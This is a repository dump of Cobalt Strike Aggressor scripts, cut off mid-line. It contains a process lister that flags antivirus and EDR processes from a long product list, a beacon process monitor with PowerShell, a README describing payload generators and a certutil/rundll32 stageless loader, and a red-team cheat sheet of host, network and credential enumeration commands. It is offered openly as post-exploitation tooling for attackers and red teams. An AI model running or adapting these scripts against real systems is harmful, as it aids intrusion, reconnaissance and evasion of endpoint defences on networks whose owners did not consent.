\"symwsc.exe\", \"sysdoc32.exe\", \"sysedit.exe\", \"sysupd.exe\", \"taskmo.exe\", \"taumon.exe\", \"tbmon.exe\", \"tbscan.exe\", \"tc.exe\", \"tca.exe\", \"tclproc.exe\", \"tcm.exe\", \"tdimon.exe\", \"tds-3.exe\", \"tds2-98.exe\", \"tds2-nt.exe\", \"teekids.exe\", \"tfak.exe\", \"tfak5.exe\", \"tgbob.exe\", \"titanin.exe\", \"titaninxp.exe\", \"tmas.exe\", \"tmlisten.exe\", \"tmntsrv.exe\", \"tmpfw.exe\", \"tmproxy.exe\", \"tnbutil.exe\", \"tpsrv.exe\", \"tracesweeper.exe\", \"trickler.exe\", \"trjscan.exe\", \"trjsetup.exe\", \"trojantrap3.exe\", \"trupd.exe\", \"tsadbot.exe\", \"tvmd.exe\", \"tvtmd.exe\", \"udaterui.exe\", \"undoboot.exe\", \"unvet32.exe\", \"updat.exe\", \"updtnv28.exe\", \"upfile.exe\", \"upgrad.exe\", \"uplive.exe\", \"urllstck.exe\", \"usergate.exe\", \"usrprmpt.exe\", \"utpost.exe\", \"v2iconsole.exe\", \"v3clnsrv.exe\", \"v3exec.exe\", \"v3imscn.exe\", \"vbcmserv.exe\", \"vbcons.exe\", \"vbust.exe\", \"vbwin9x.exe\", \"vbwinntw.exe\", \"vcsetup.exe\", \"vet32.exe\", \"vet95.exe\", \"vetmsg.exe\", \"vettray.exe\", \"vfsetup.exe\", \"vir-help.exe\", \"virusmdpersonalfirewall.exe\", \"vnlan300.exe\", \"vnpc3000.exe\", \"vpatch.exe\", \"vpc32.exe\", \"vpc42.exe\", \"vpfw30s.exe\", \"vprosvc.exe\", \"vptray.exe\", \"vrv.exe\", \"vrvmail.exe\", \"vrvmon.exe\", \"vrvnet.exe\", \"vscan40.exe\", \"vscenu6.02d30.exe\", \"vsched.exe\", \"vsecomr.exe\", \"vshwin32.exe\", \"vsisetup.exe\", \"vsmain.exe\", \"vsmon.exe\", \"vsserv.exe\", \"vsstat.exe\", \"vstskmgr.exe\", \"vswin9xe.exe\", \"vswinntse.exe\", \"vswinperse.exe\", \"w32dsm89.exe\", \"w9x.exe\", \"watchdog.exe\", \"webdav.exe\", \"webproxy.exe\", \"webscanx.exe\", \"webtrap.exe\", \"webtrapnt.exe\", \"wfindv32.exe\", \"wfxctl32.exe\", \"wfxmod32.exe\", \"wfxsnt40.exe\", \"whoswatchingme.exe\", \"wimmun32.exe\", \"win-bugsfix.exe\", \"winactive.exe\", \"winmain.exe\", \"winnet.exe\", \"winppr32.exe\", \"winrecon.exe\", \"winroute.exe\", \"winservn.exe\", \"winssk32.exe\", \"winstart.exe\", \"winstart001.exe\", \"wintsk32.exe\", \"winupdate.exe\", \"wkufind.exe\", \"wnad.exe\", \"wnt.exe\", \"wradmin.exe\", \"wrctrl.exe\", \"wsbgate.exe\", \"wssfcmai.exe\", \"wupdater.exe\", \"wupdt.exe\", \"wyvernworksfirewall.exe\", \"xagt.exe\", \"xagtnotif.exe\", \"xcommsvr.exe\", \"xfilter.exe\", \"xpf202en.exe\", \"zanda.exe\", \"zapro.exe\", \"zapsetup3001.exe\", \"zatutor.exe\", \"zhudongfangyu.exe\", \"zlclient.exe\", \"zlh.exe\", \"zonalm2601.exe\", \"zonealarm.exe\", \"cb.exe\", \"MsMpEng.exe\", \"MsSense.exe\", \"CSFalconService.exe\", \"CSFalconContainer.exe\", \"redcloak.exe\", \"OmniAgent.exe\",\"CrAmTray.exe\",\"AmSvc.exe\",\"minionhost.exe\",\"PylumLoader.exe\",\"CrsSvc.exe\");\r\n    @admin = @(\"MobaXterm.exe\", \"bash.exe\", \"git-bash.exe\", \"mmc.exe\", \"Code.exe\", \"notepad++.exe\", \"notepad.exe\", \"cmd.exe\", \"drwatson.exe\", \"DRWTSN32.EXE\", \"drwtsn32.exe\", \"dumpcap.exe\", \"ethereal.exe\", \"filemon.exe\", \"idag.exe\", \"idaw.exe\", \"k1205.exe\", \"loader32.exe\", \"netmon.exe\", \"netstat.exe\", \"netxray.exe\", \"NmWebService.exe\", \"nukenabber.exe\", \"portmon.exe\", \"powershell.exe\", \"PRTG Traffic Gr.exe\", \"PRTG Traffic Grapher.exe\", \"prtgwatchdog.exe\", \"putty.exe\", \"regmon.exe\", \"SystemEye.exe\", \"taskman.exe\", \"TASKMGR.EXE\", \"tcpview.exe\", \"Totalcmd.exe\", \"TrafMonitor.exe\", \"windbg.exe\", \"winobj.exe\", \"wireshark.exe\", \"WMonAvNScan.exe\", \"WMonAvScan.exe\", \"WMonSrv.exe\",\"regedit.exe\", \"regedit32.exe\", \"accesschk.exe\", \"accesschk64.exe\", \"AccessEnum.exe\", \"ADExplorer.exe\", \"ADInsight.exe\", \"adrestore.exe\", \"Autologon.exe\", \"Autoruns.exe\", \"Autoruns64.exe\", \"autorunsc.exe\", \"autorunsc64.exe\", \"Bginfo.exe\", \"Bginfo64.exe\", \"Cacheset.exe\", \"Clockres.exe\", \"Clockres64.exe\", \"Contig.exe\", \"Contig64.exe\", \"Coreinfo.exe\", \"ctrl2cap.exe\", \"Dbgview.exe\", \"Desktops.exe\", \"disk2vhd.exe\", \"diskext.exe\", \"diskext64.exe\", \"Diskmon.exe\", \"DiskView.exe\", \"du.exe\", \"du64.exe\", \"efsdump.exe\", \"FindLinks.exe\", \"FindLinks64.exe\", \"handle.exe\", \"handle64.exe\", \"hex2dec.exe\", \"hex2dec64.exe\", \"junction.exe\", \"junction64.exe\", \"ldmdump.exe\", \"Listdlls.exe\", \"Listdlls64.exe\", \"livekd.exe\", \"livekd64.exe\", \"LoadOrd.exe\", \"LoadOrd64.exe\", \"LoadOrdC.exe\", \"LoadOrdC64.exe\", \"logonsessions.exe\", \"logonsessions64.exe\", \"movefile.exe\", \"movefile64.exe\", \"notmyfault.exe\", \"notmyfault64.exe\", \"notmyfaultc.exe\", \"notmyfaultc64.exe\", \"ntfsinfo.exe\", \"ntfsinfo64.exe\", \"pagedfrg.exe\", \"pendmoves.exe\", \"pendmoves64.exe\", \"pipelist.exe\", \"pipelist64.exe\", \"portmon.exe\", \"procdump.exe\", \"procdump64.exe\", \"procexp.exe\", \"procexp64.exe\", \"Procmon.exe\", \"PsExec.exe\", \"PsExec64.exe\", \"psfile.exe\", \"psfile64.exe\", \"PsGetsid.exe\", \"PsGetsid64.exe\", \"PsInfo.exe\", \"PsInfo64.exe\", \"pskill.exe\", \"pskill64.exe\", \"pslist.exe\", \"pslist64.exe\", \"PsLoggedon.exe\", \"PsLoggedon64.exe\", \"psloglist.exe\", \"pspasswd.exe\", \"pspasswd64.exe\", \"psping.exe\", \"psping64.exe\", \"PsService.exe\", \"PsService64.exe\", \"psshutdown.exe\", \"pssuspend.exe\", \"pssuspend64.exe\", \"RAMMap.exe\", \"RegDelNull.exe\", \"RegDelNull64.exe\", \"regjump.exe\", \"ru.exe\", \"ru64.exe\", \"sdelete.exe\", \"sdelete64.exe\", \"ShareEnum.exe\", \"ShellRunas.exe\", \"sigcheck.exe\", \"sigcheck64.exe\", \"streams.exe\", \"streams64.exe\", \"strings.exe\", \"strings64.exe\", \"sync.exe\", \"sync64.exe\", \"Sysmon.exe\", \"Sysmon64.exe\", \"Tcpvcon.exe\", \"Tcpview.exe\", \"Testlimit.exe\", \"Testlimit64.exe\", \"vmmap.exe\", \"Volumeid.exe\", \"Volumeid64.exe\", \"whois.exe\", \"whois64.exe\", \"Winobj.exe\", \"ZoomIt.exe\", \"KeePass.exe\", \"1Password.exe\", \"lastpass.exe\");\r\n\t\r\n\tlocal('$outps $temp $name $ppid $pid $arch $user $session @ps');\r\n\t$outps .= \"\\cC[*]\\o Process List with process highlighting\\n\";\r\n\t$outps .= \"\\cC[*]\\o Current Running PID: \\c8 Yellow \". $bd['pid'] .\" \\o \\n\";\r\n\t$outps .= \"\\cC[*]\\o Explorer/Winlogon: \\c2 BLUE \\o \\n\";\r\n\t$outps .= \"\\cC[*]\\o Admin Tools: \\cB LIGHT BLUE \\o \\n\";\r\n\t$outps .= \"\\cC[*]\\o Browsers: \\c3 GREEN \\o \\n\";\r\n\t$outps .= \"\\cC[*]\\o AV/EDR: \\c4 RED \\o \\n\\n\";\r\n\t$outps .= \" PID   PPID  Name                         Arch  Session     User\\n\";\r\n\t$outps .= \"\\cE ---   ----  ----                         ----  -------     -----\\n\";\r\n\r\n\tforeach $temp (split(\"\\n\", [\"$2\" trim])) {\r\n\t\t($name, $ppid, $pid, $arch, $user, $session) = split(\"\\t\", $temp);\r\n\t\t# highlight AV processes in RED.\r\n\t\tif(iff($name in @av,true,false)) {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\c4 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t# highlight current process in YELLOW\r\n\t\t} else if ($pid eq $bd['pid']) {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\c8 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t# highlight explorer , winlogon in BLUE\r\n\t\t} else if ($name eq \"explorer.exe\" || $name eq \"winlogon.exe\") {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\c2 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t# highlight browsers processes in GREEN\r\n\t\t} else if ($name eq \"chrome.exe\" || $name eq \"firefox.exe\" || $name eq \"iexplore.exe\" || $name eq \"MicrosoftEdgeCP.exe\" || $name eq \"MicrosoftEdge.exe\") {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\c3 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t# highlight av1 processes in RED.\r\n\t\t} else if(iff($name in @av1,true,false)) {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\c4 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t# highlight Admin Tools in Light Blue\r\n\t\t} else if(iff($name in @admin,true,false)) {\r\n\t\tpush(@ps, %(pid => $pid, entry => \"\\cB $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \\o\"));\r\n\t\t} else {\r\n\t\tpush(@ps, %(pid => $pid, entry => \" $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user\"));\r\n\t\t}\r\n\t}\r\n\t# sort the processes please\r\n\tsort({ return $1['pid'] <=> $2['pid']; }, @ps);\r\n\t# append to our outstring\r\n\tforeach $temp (@ps) {\r\n\t\t$outps .= \"$temp['entry'] \\n\";\r\n\t}\r\n\treturn $outps;\r\n}\r\n"
        },
        {
          "name": "ProcessMonitor.cna",
          "type": "blob",
          "size": 5.72265625,
          "content": "#Process Monitor\r\n#Author: @r3dQu1nn\r\n#Queries the processes at a set interval to see what processes have been started since that interval time\r\n#Thanks to @Alyssa (ramen0x3f) for the code snippets! Big thanks to @i_am_excite for the powershell code!\r\n#Big thanks to raffi for the on heartbeat help!\r\n\r\n#Global Variables\r\n$timer = \"\";\r\n$interval = \"5m\";\r\ninclude(script_resource(\"ProcessMonitor.ps1\"));\r\n\r\n#Register Alias for Process Monitor\r\nbeacon_command_register(\"ProcessMonitor\", \r\n\t\"Start/Stop and Change the Interval Time for Process Monitor\",\r\n\t\"Synopsis: ProcessMonitor [Start/Stop] [Time]\\n\" .\r\n\t\"Options: 1m, 5m (default), 10m, 20m, 30m. If no time supplied, default of 5m is used.\");\r\n\r\n#Process Monitor alias\r\nalias ProcessMonitor {\r\n\tif ( $2 eq 'Start' && $3 eq '1m' ) {\r\n\t\tif (-exists script_resource(\"ProcessMonitor.ps1\")) {\r\n\t\t\t$bid = $1;\r\n\t\t\t$timer = \"Start\";\r\n\t\t\t$interval = \"1m\";\r\n\t\t\tblog($1, \"\\c9Process Monitor Started! Time Interval is set to \" . $interval);\r\n\t\t\tblog($1, \"\\c4Run ProcessMonitor [Stop] to stop ProcessMonitor from running continuously.\");\r\n\t\t\tblog($1, \"\\cBDepending on your sleep time, results might come before or after checkin.\");\r\n\t\t\tbpowershell_import!($1, script_resource(\"ProcessMonitor.ps1\"));\r\n\t\t\tbpowerpick!($1, 'Get-Proc 1');\r\n\t\t}\r\n\t\telse {\r\n\t\t\t$timer = \"\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tberror($1, \"\\c4ProcessMonitor.ps1 does not exist!\");\r\n\t\t\tshow_message(\"ProcessMonitor.ps1 does not exist!\");\r\n\t\t}\r\n\t}\r\n\telse if ( $2 eq 'Start' && $3 eq '5m' ) {\r\n\t\tif (-exists script_resource(\"ProcessMonitor.ps1\")) {\r\n\t\t\t$bid = $1;\r\n\t\t\t$timer = \"Start\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tblog($1, \"\\c9Process Monitor Started! Time Interval is set to \" . $interval);\r\n\t\t\tblog($1, \"\\c4Run ProcessMonitor [Stop] to stop ProcessMonitor from running continuously.\");\r\n\t\t\tblog($1, \"\\cBDepending on your sleep time, results might come before or after checkin.\");\r\n\t\t\tbpowershell_import!($1, script_resource(\"ProcessMonitor.ps1\"));\r\n\t\t\tbpowerpick!($1, 'Get-Proc 5');\r\n\t\t}\r\n\t\telse {\r\n\t\t\t$timer = \"\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tberror($1, \"\\c4ProcessMonitor.ps1 does not exist!\");\r\n\t\t\tshow_message(\"ProcessMonitor.ps1 does not exist!\");\r\n\t\t}\r\n\t}\r\n\telse if ( $2 eq 'Start' && $3 eq '10m' ) {\r\n\t\tif (-exists script_resource(\"ProcessMonitor.ps1\")) {\r\n\t\t\t$bid = $1;\r\n\t\t\t$timer = \"Start\";\r\n\t\t\t$interval = \"10m\";\r\n\t\t\tblog($1, \"\\c9Process Monitor Started! Time Interval is set to \" . $interval);\r\n\t\t\tblog($1, \"\\c4Run ProcessMonitor [Stop] to stop ProcessMonitor from running continuously.\");\r\n\t\t\tblog($1, \"\\cBDepending on your sleep time, results might come before or after checkin.\");\r\n\t\t\tbpowershell_import!($1, script_resource(\"ProcessMonitor.ps1\"));\r\n\t\t\tbpowerpick!($1, 'Get-Proc 10');\r\n\t\t}\r\n\t\telse {\r\n\t\t\t$timer = \"\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tberror($1, \"\\c4ProcessMonitor.ps1 does not exist!\");\r\n\t\t\tshow_message(\"ProcessMonitor.ps1 does not exist!\");\r\n\t\t}\r\n\t}\r\n\telse if ( $2 eq 'Start' && $3 eq '20m' ) {\r\n\t\tif (-exists script_resource(\"ProcessMonitor.ps1\")) {\r\n\t\t\t$bid = $1;\r\n\t\t\t$timer = \"Start\";\r\n\t\t\t$interval = \"20m\";\r\n\t\t\tblog($1, \"\\c9Process Monitor Started! Time Interval is set to \" . $interval);\r\n\t\t\tblog($1, \"\\c4Run ProcessMonitor [Stop] to stop ProcessMonitor from running continuously.\");\r\n\t\t\tblog($1, \"\\cBDepending on your sleep time, results might come before or after checkin.\");\r\n\t\t\tbpowershell_import!($1, script_resource(\"ProcessMonitor.ps1\"));\r\n\t\t\tbpowerpick!($1, 'Get-Proc 20');\r\n\t\t}\r\n\t\telse {\r\n\t\t\t$timer = \"\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tberror($1, \"\\c4ProcessMonitor.ps1 does not exist!\");\r\n\t\t\tshow_message(\"ProcessMonitor.ps1 does not exist!\");\r\n\t\t}\r\n\t}\r\n    else if ( $2 eq 'Start' && $3 eq '30m' ) {\r\n\t\tif (-exists script_resource(\"ProcessMonitor.ps1\")) {\r\n\t\t\t$bid = $1;\r\n\t\t\t$timer = \"Start\";\r\n\t\t\t$interval = \"30m\";\r\n\t\t\tblog($1, \"\\c9Process Monitor Started! Time Interval is set to \" . $interval);\r\n\t\t\tblog($1, \"\\c4Run ProcessMonitor [Stop] to stop ProcessMonitor from running continuously.\");\r\n\t\t\tblog($1, \"\\cBDepending on your sleep time, results might come before or after checkin.\");\r\n\t\t\tbpowershell_import!($1, script_resource(\"ProcessMonitor.ps1\"));\r\n\t\t\tbpowerpick!($1, 'Get-Proc 30');\r\n\t\t}\r\n\t\telse {\r\n\t\t\t$timer = \"\";\r\n\t\t\t$interval = \"5m\";\r\n\t\t\tberror($1, \"\\c4ProcessMonitor.ps1 does not exist!\");\r\n\t\t\tshow_message(\"ProcessMonitor.ps1 does not exist!\");\r\n\t\t}\r\n\t}\r\n\telse if ( $2 eq 'Stop' ) {\r\n\t\t$timer = \"Stop\";\r\n\t\t$interval = \"5m\";\r\n\t\tblog($1, \"\\cBProcess Monitor has Stopped.\");\r\n\t}\r\n    else if ( $2 is $null ) {\r\n        blog($1, \"\\c4Please provide 'Start' then a correct time interval to Start Process Monitor.\");\r\n        show_message(\"Please provide 'Start' then a correct time interval to Start Process Monitor.\");\r\n    }\r\n\telse if ( $3 != '1m' || $3 != '5m' || $3 != '10m' || $3 != '20m' || $3 != '30m' ) {\r\n        blog($1, \"\\c4Please provide a correct time interval to Start Process Monitor.\");\r\n        show_message(\"Please provide a correct time interval to Start Process Monitor.\");\r\n    }\r\n\telse {\r\n\t\t$timer = \"\";\r\n\t\t$interval = \"5m\";\r\n\t}\r\n}\r\n\r\n#Process Monitor heartbeat checks\r\non heartbeat_1m {\r\n\tif ( $timer eq 'Start' && $interval eq '1m' ) {\r\n\t\tbpowerpick!($bid, 'Get-Proc 1');\r\n\t}\r\n\telse if ( $timer eq 'Stop' ) {\r\n\t}\r\n\telse {\r\n\t}\r\n}\r\n\r\non heartbeat_5m {\r\n\tif ( $timer eq 'Start' && $interval eq '5m' ) {\r\n\t\tbpowerpick!($bid, 'Get-Proc 5');\r\n\t}\r\n\telse if ( $timer eq 'Stop' ) {\r\n\t}\r\n\telse {\r\n\t}\r\n}\r\n\r\non heartbeat_10m {\r\n\tif ( $timer eq 'Start' && $interval eq '10m' ) {\r\n\t\tbpowerpick!($bid, 'Get-Proc 10');\r\n\t}\r\n\telse if ( $timer eq 'Stop' ) {\r\n\t}\r\n\telse {\r\n\t}\r\n}\r\n\r\non heartbeat_20m {\r\n\tif ( $timer eq 'Start' && $interval eq '20m' ) {\r\n\t\tbpowerpick!($bid, 'Get-Proc 20');\r\n\t}\r\n\telse if ( $timer eq 'Stop' ) {\r\n\t}\r\n\telse {\r\n\t}\r\n}\r\n\r\non heartbeat_30m {\r\n\tif ( $timer eq 'Start' && $interval eq '30m' ) {\r\n\t\tbpowerpick!($bid, 'Get-Proc 30');\r\n\t}\r\n\telse if ( $timer eq 'Stop' ) {\r\n\t}\r\n\telse {\r\n\t}\r\n}"
        },
        {
          "name": "ProcessMonitor.ps1",
          "type": "blob",
          "size": 1.400390625,
          "content": "function Get-Proc {\r\n<#\r\n.DESCRIPTION\r\nCobaltstrike has a great general function for processes: the 'ps' command. Use that if you need to dump ALL the processes w/ arch. \r\n\r\nThis solution will show the running processes that have a creation date within the past 1 hour, giving more SA to the operator/analyst than just looking through an entire process list\r\n\r\nBoth solutions have their place. It is up to you to know how to use which when you need it.\r\n\r\nModule info for process list has also been removed because nobody used it in the two years that the survey script was around. If you need to do IR on a box, there are better ways to do so\r\nthan by clogging up the screen in a survey. \r\n#>\r\n\r\nparam\r\n\t\t(\r\n\t\t\t[Parameter(Mandatory = $True)]\r\n\t\t\t[string]$Time\r\n\t\t)\r\n\r\n$test3 = gwmi win32_process | sort -Property ProcessID\r\n$q = get-date\r\n\r\n\"`n[+] Processes created in the past $Time minutes`n\"\r\n\"{0,-8}{1,-8}{2,-20} {3,-20} {4}\" -f \"PID\",\"PPID\",\"PID Name\",\"PPID Name\",\"Owner\"\r\n\r\nforeach ($i in $test3){\r\n    $qq = [Management.ManagementDateTimeConverter]::ToDateTime($i.creationdate)\r\n        if ($qq -gt $q.addminutes(-$Time)){\r\n            $z = $i.ParentProcessId\r\n            \"{0,-8}{1,-8}{2,-20} {3,-20} {4}\"  -f $i.ProcessId, $i.ParentProcessId, $( if($i.processname.length -gt 20){ $i.processname.substring(0,20)} else{$i.processname}), $($test3 | where {$_.processid -eq $z}).caption , $i.GetOwner().user\r\n        }\r\n    }\r\n}"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 1.9130859375,
          "content": "# Aggressor Scripts\nCollection of Aggressor scripts for Cobalt Strike 3.0+ pulled from multiple sources\n* All_In_One.cna v1 - Removed and outdated\n    \n   * All purpose script to enhance the user's experience with cobaltstrike. Custom menu creation, Logging, Persistence,        Enumeration, and 3rd party script integration.\n    * Version 2 is currently in development!\n\n* ArtifactPayloadGenerator.cna\n\n    * Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener\n    \n    * Creates /opt/cobaltstrike/Staged_Payloads, /opt/cobaltstrike/Stageless_Payloads\n    \n* AVQuery.cna\n\n    * Queries the Registry with powershell for all AV Installed on the target\n    \n    * Quick and easy way to get the AV you are dealing with as an attacker\n    \n    ![av](https://user-images.githubusercontent.com/27856212/28275624-7331ab2e-6ae2-11e7-8405-3393e917863e.png)\n\n* CertUtilWebDelivery.cna\n\n    * Stageless Web Delivery using CertUtil.exe \n    \n    * Powerpick is used to spawn certutil.exe to download the stageless payload on target and execute with rundll32.exe\n    \n    ![certutil2](https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG)\n    \n* EDR.cna\n    \n    * Detects EDR solutions running on local/remote hosts\n    \n* RedTeamRepo.cna\n\n    * A common collection of OS commands, and Red Team Tips for when you have no Google or RTFM on hand.\n    \n    * Script will be updated on occasion, feedback and more inputs are welcomed!\n    \n    ![redrepo](https://user-images.githubusercontent.com/27856212/30020754-00fedd70-9133-11e7-80d4-dff3be7ab876.PNG)\n    \n* ProcessColor.cna\n\n    * Color coded process listing without the file requirement.\n    \n    * Thanks to @oldb00t for the original version: https://github.com/oldb00t/AggressorScripts/tree/master/Ps-highlight\n    \n    ![process](https://user-images.githubusercontent.com/27856212/33582815-575d368e-d914-11e7-8d48-fd4c915af5d6.png)\n    \n"
        },
        {
          "name": "RedTeamRepo.cna",
          "type": "blob",
          "size": 10.9931640625,
          "content": "#RedTeamRepo\r\n#Author: @r3dqu1nn\r\n#A Common Repository for when you forget your RTFM and no googles.\r\n#https://www.sock-raw.org/wiki/doku.php/start - @ithilgore\r\n#http://pwnwiki.io/#!index.md\r\n#https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\r\n#This script will be continuously updated. Any input or feedback is welcomed!! Enjoy and happy hacking!\r\n\r\nbeacon_command_register(\"RedRepo\", \"A large repository of commands and red team tips\",\r\n\t\"\\nSyntax: RedRepo [Option]\\n\" .\r\n\t\"\\nList Options: RedRepo [List]\\n\" .\r\n\t\"\\nDisplays well known commands for an OS, or diplays great tips or tricks for a Red Team Operator.\\n\");\r\n\r\nalias RedRepo {\r\n\r\n\tif ($2 ismatch 'List') {\r\n\t\tlocal('$out');\r\n\t\t#blog($1, \"\\c0\\n\\nRepo Options\\n============\");\r\n\t\t$out = \"RedRepo Options\\n\";\r\n\t\t$out .= \"    \\c0===============\\n\\n\";\r\n\t\t$out .= \"    Option                   Description\\n\";\r\n\t\t$out .= \"\\c0    ------                   -----------\\n\";\r\n\t\tblog($1, $out);\r\n\t\tblog2($1, \"\\cBWindows                  Windows Enumeration Commands\");\r\n\t\tblog2($1, \"\\cBLinux                    Linux Enumeration Commands\");\r\n\t\tblog2($1, \"\\cBTips                     Red Team Tips\");\r\n\t\tblog2($1, \"\\cBList                     List of Options\");\r\n\t\tblog2($1, \"\\cBSmile                    Happy Hacking!\\n\");\r\n\r\n\t}\r\n\r\n\tif ($2 ismatch 'Windows') {\r\n\r\n\t\tblog($1, \"\\t\\c4====== Common Windows Commands ======\\n\");\r\n\r\n\t\t#WMIC Commands\r\n\t\tblog($1, \"\\t\\c4====== WMIC Enumeration Commands ======\\n\");\r\n\r\n\t\tblog2($1, \"\\t\\cBwmic computersystem get Name,domain,NumberofProcessors,Roles,totalphysicalmemory\");\r\n\t\tblog2($1, \"\\t\\cBwmic desktop get Name,ScreenSaverActive,Wallpaper\");\r\n\t\tblog2($1, \"\\t\\cBwmic netlogin get Caption,Privileges,UserID,UserType,NumberOfLogons,PasswordAge,LogonServer,Workstations\");\r\n\t\tblog2($1, \"\\t\\cBwmic process get CSName,Description,ExecutablePath,ProcessId\");\r\n\t\tblog2($1, \"\\t\\cBwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName\");\r\n\t\tblog2($1, \"\\t\\cBwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace\");\r\n\t\tblog2($1, \"\\t\\cBwmic netuse list full\");\r\n\t\tblog2($1, \"\\t\\cBwmic startup get Caption,Command,Location,User\");\r\n\t\tblog2($1, \"\\t\\cBwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version\");\r\n\t\tblog2($1, \"\\t\\cBwmic qfe get HotFixID,InstalledOn\");\r\n\t\tblog2($1, \"\\t\\cBwmic ntdomain list\");\r\n\t\tblog2($1, \"\\t\\cBwmic bios [list full]\\n\");\r\n\r\n\t\tblog($1, \"\\t\\c4====== Info Harvesting ======\\n\");\r\n\t\t#Host Enumeration\r\n\t\tblog2($1, \"\\t\\cBsysteminfo\");\r\n\t\tblog2($1, \"\\t\\cBsysteminfo | findstr /B /C:\\\"OS Name\\\" /C:\\\"OS Version\\\"\");\r\n\t\tblog2($1, \"\\t\\cBSET\");\r\n\t\tblog2($1, \"\\t\\cBipconfig /all\");\r\n\t\tblog2($1, \"\\t\\cBroute print\");\r\n\t\tblog2($1, \"\\t\\cBarp -a\");\r\n\t\tblog2($1, \"\\t\\cBnetstat -ano | findstr /I listening\");\r\n\t\tblog2($1, \"\\t\\cBnetstat -ano | findstr /I established\");\r\n\t\tblog2($1, \"\\t\\cBnbtstat -A *target IP*\");\r\n\t\tblog2($1, \"\\t\\cBnslookup\");\r\n\t\tblog2($1, \"\\t\\cBreg query [key]\");\r\n\t\tblog2($1, \"\\t\\cBGet-ItemProperty [key] (PowerShell)\");\r\n\t\tblog2($1, \"\\t\\cBschtasks /query /fo LIST /v\");\r\n\t\tblog2($1, \"\\t\\cBsc query\");\r\n\t\tblog2($1, \"\\t\\cBsc qc [service name]\");\r\n\t\tblog2($1, \"\\t\\cBtasklist /SVC (/S Remote Computer)\");\r\n\t\tblog2($1, \"\\t\\cBDRIVERQUERY\");\r\n\t\tblog2($1, \"\\t\\cBRun C:\\\\Windows\\\\System32\\\\gatherNetworkInfo.vbs script and check results inside C:\\\\Windows\\\\System32\\\\Config\");\r\n\t\tblog2($1, \"\\t\\cBgpresult /z\");\r\n\t\tblog2($1, \"\\t\\cBwhoami /all\");\r\n\t\tblog2($1, \"\\t\\cBnetsh firewall show conf\");\r\n\t\tblog2($1, \"\\t\\cBnetsh wlan show profiles\");\r\n\t\tblog2($1, \"\\t\\cBnetsh advfirewall show allprofiles\\n\");\r\n\r\n\t\tblog($1, \"\\t\\c4======= Net Commands =======\\n\");\r\n\t\t#Old School Net Commands\r\n\t\tblog2($1, \"\\t\\cBnet accounts [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet group \\\"groupname\\\" [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet localgroup \\\"groupname\\\" [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet view [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet session\");\r\n\t\tblog2($1, \"\\t\\cBnet share\");\r\n\t\tblog2($1, \"\\t\\cBnet user [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet user [username] [/domain]\");\r\n\t\tblog2($1, \"\\t\\cBnet use * \\\\\\\\IP\\\\C$ /user:username [password]\");\r\n\t\tblog2($1, \"\\t\\cBUse the built in net commands with Beacon! [help net]\\n\");\r\n\r\n\t}\r\n\r\n\tif ($2 ismatch 'Linux') {\r\n\r\n\t\tblog($1, \"\\t\\c4====== Common Linux Commands ======\\n\");\r\n\r\n\t\tblog($1, \"\\t\\c4====== Info Harvesting/Host/Network Enumeration ======\\n\")\r\n\r\n\t\tblog2($1, \"\\t\\cBcat /etc/issue\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/*-release\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/*-release | grep -E '\\\"NAME=\\\"|ID|VERSION|ID_LIKE'\");\r\n\t\tblog2($1, \"\\t\\cBcat /proc/version\");\r\n\t\tblog2($1, \"\\t\\cBrpm -q kernel\");\r\n\t\tblog2($1, \"\\t\\cBdmesg | grep Linux\");\r\n\t\tblog2($1, \"\\t\\cBls /boot | grep vmlinuz-\");\r\n\t\tblog2($1, \"\\t\\cBlsb_release -a\");\r\n\t\tblog2($1, \"\\t\\cBlast -a\");\r\n  \t\tblog2($1, \"\\t\\cBuname -a\");\r\n  \t\tblog2($1, \"\\t\\cBuname -mrs\");\r\n  \t\tblog2($1, \"\\t\\cBid\");\r\n\t\tblog2($1, \"\\t\\cBhistory\");\r\n\t\tblog2($1, \"\\t\\cBarp -a\");\r\n\t\tblog2($1, \"\\t\\cBnetstat -anot\");\r\n\t\tblog2($1, \"\\t\\cBps -elf\");\r\n\t\tblog2($1, \"\\t\\cBps -elf | grep root\");\r\n\t\tblog2($1, \"\\t\\cBls -la /var/www/html/\");\r\n\t\tblog2($1, \"\\t\\cBservice apache2 status\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/resolv.conf\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/networks\");\r\n\t\tblog2($1, \"\\t\\cBiptables -L\");\r\n\t\tblog2($1, \"\\t\\cBiptables -L -t nat\");\r\n\t\tblog2($1, \"\\t\\cBlsof -i\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/services\");\r\n\t\tblog2($1, \"\\t\\cBgrep 80 /etc/services\");\r\n\t\tblog2($1, 